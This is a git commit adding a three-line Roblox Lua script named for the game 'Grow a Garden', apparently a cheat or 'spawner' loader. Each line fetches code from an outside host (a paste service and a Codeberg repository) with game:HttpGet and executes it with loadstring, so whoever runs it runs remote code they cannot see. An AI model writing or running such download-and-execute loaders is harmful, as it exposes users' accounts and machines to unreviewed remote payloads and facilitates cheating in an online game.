1d065e1b67e9be68ad9cb4344e37b6a0f5547e1d
Ziadian <heeza9546@gmail.com>
2025-07-24 19:00:55 +0700

    Create growagardenscript.lua

---
+++ growagardenscript.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/PrgKkUmyirMQhNb1/raw", true))()
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/DarkBackup/script/raw/branch/main/loadstring"))()
+Spawner.Load()
